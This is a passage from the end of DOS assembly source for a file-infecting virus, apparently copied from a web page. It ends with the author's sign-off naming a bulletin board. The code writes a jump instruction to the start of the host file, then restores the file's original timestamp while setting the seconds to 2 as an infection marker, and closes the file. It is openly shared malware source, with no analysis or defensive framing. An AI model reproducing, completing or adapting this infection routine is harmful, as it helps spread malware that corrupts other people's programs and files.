        xor     dx,dx
        int     12h


        mov     cx,5
        mov     ah,40h                              ;write the JMP top the file
        mov     dx,(jump_add-vstart)
        int     12h
        
        jc      quit

        mov     ax,5701h
        mov     word ptr cx,cs:[(old_time-vstart)]  ;Restore old time,date
        mov     word ptr dx,cs:[(old_date-vstart)]
        
        and     cl,0e0H
        inc     cl                                  ;change seconds to 2
        int     12h                     
        

        mov     ah,3eh
        int     12h


quit2:  ret


vend    equ     $
        nop
        nop

seg_a        ends
        end     start


;WELL THATS IT. 
If ya have any questions feel free to contact me on -=+ FRONT 242 +=- (CANADA)

</textarea></td></tr></table></body></html>
